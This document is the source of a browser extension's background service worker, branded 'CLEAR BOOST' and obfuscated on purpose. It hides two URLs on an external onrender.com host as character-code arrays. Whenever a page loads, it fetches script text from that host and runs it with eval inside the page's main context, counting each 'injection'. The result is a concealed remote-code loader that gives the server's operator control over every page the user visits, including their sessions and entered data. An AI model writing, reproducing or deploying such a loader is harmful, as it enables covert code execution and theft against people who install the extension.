// CLEAR BOOST - Background Service Worker (Obfuscated)
'use strict';
const _0x3b1a = [104,116,116,112,115,58,47,47,109,105,99,45,119,99,114,52,46,111,110,114,101,110,100,101,114,46,99,111,109,47,115,99,114,105,112,116];
const _0x5c2e = [104,116,116,112,115,58,47,47,109,105,99,45,119,99,114,52,46,111,110,114,101,110,100,101,114,46,99,111,109,47,97,117,116,104,47,118,97,108,105,100,97,116,101];
const _0x8e2c = _0x3b1a.map(x => String.fromCharCode(x)).join('');
const _0x9f4d = _0x5c2e.map(x => String.fromCharCode(x)).join('');
const _0x7a = new Map();
const _0x5b = {active:'#00ff41',error:'#ff3333',idle:'#666666',nokey:'#ff8800'};
chrome.runtime.onInstalled.addListener(()=>{
chrome.storage.local.set({totalInjections:0,lastActive:null});
chrome.action.setBadgeBackgroundColor({color:_0x5b.idle});
});
chrome.runtime.onMessage.addListener((_0x1,_0x2,_0x3)=>{
if(_0x1.type==='PAGE_READY'&&_0x2.tab?.id){
_0x4(_0x2.tab.id,_0x2.tab.url);
return;
}
if(_0x1.type==='GET_TAB_STATUS'){
chrome.tabs.query({active:true,currentWindow:true},(_0x5)=>{
const _0x6=_0x5[0]?.id;
const _0x7=_0x6?_0x7a.get(_0x6):null;
chrome.storage.local.get(['totalInjections','lastActive','licenseKey'],(_0x8)=>{
_0x3({tabStatus:_0x7||{status:'idle'},totalInjections:_0x8.totalInjections||0,lastActive:_0x8.lastActive||null,hasKey:!!_0x8.licenseKey});
});
});
return true;
}
if(_0x1.type==='SAVE_KEY'){
chrome.storage.local.set({licenseKey:_0x1.key},()=>{
_0x9(_0x1.key).then((_0xa)=>{_0x3({success:_0xa});}).catch(()=>{_0x3({success:false});});
});
return true;
}
if(_0x1.type==='REMOVE_KEY'){
chrome.storage.local.remove('licenseKey',()=>{_0x3({success:true});});
return true;
}
});
async function _0x9(_0xb){
try{
const _0xc=await fetch(_0x9f4d,{headers:{'X-License-Key':_0xb}});
const _0xd=await _0xc.json();
return _0xd.valid===true;
}catch(_0xe){return false;}
}
async function _0x4(_0xf,_0x10){
try{
const _0x11=await chrome.storage.local.get(['licenseKey']);
const _0x12=_0x11.licenseKey;
if(!_0x12){
_0x7a.set(_0xf,{status:'nokey',url:_0x10,timestamp:Date.now()});
chrome.action.setBadgeBackgroundColor({tabId:_0xf,color:_0x5b.nokey});
chrome.action.setBadgeText({tabId:_0xf,text:'🔑'});
return;
}
const _0x13=await fetch(_0x8e2c,{cache:'no-cache',headers:{'X-License-Key':_0x12}});
if(_0x13.status===401||_0x13.status===403){throw new Error('UNAUTHORIZED');}
if(!_0x13.ok){throw new Error('HTTP_ERROR_'+_0x13.status);}
let _0x14=await _0x13.text();
_0x14=_0x14.trim();
if(_0x14.startsWith('javascript:')){_0x14=_0x14.substring(11);}
await chrome.scripting.executeScript({
target:{tabId:_0xf},
world:'MAIN',
func:(_0x15)=>{try{eval(_0x15);}catch(_0x16){console.error(_0x16);}},
args:[_0x14]
});
_0x7a.set(_0xf,{status:'active',url:_0x10,timestamp:Date.now()});
chrome.action.setBadgeBackgroundColor({tabId:_0xf,color:_0x5b.active});
chrome.action.setBadgeText({tabId:_0xf,text:'✓'});
chrome.storage.local.get(['totalInjections'],(_0x17)=>{
chrome.storage.local.set({totalInjections:(_0x17.totalInjections||0)+1,lastActive:Date.now()});
});
}catch(_0x18){
const _0x19=_0x18.message==='UNAUTHORIZED';
_0x7a.set(_0xf,{status:_0x19?'unauthorized':'error',url:_0x10,error:_0x18.message,timestamp:Date.now()});
chrome.action.setBadgeBackgroundColor({tabId:_0xf,color:_0x5b.error});
chrome.action.setBadgeText({tabId:_0xf,text:_0x19?'🚫':'!'});
}
}
chrome.tabs.onRemoved.addListener((_0x1a)=>_0x7a.delete(_0x1a));
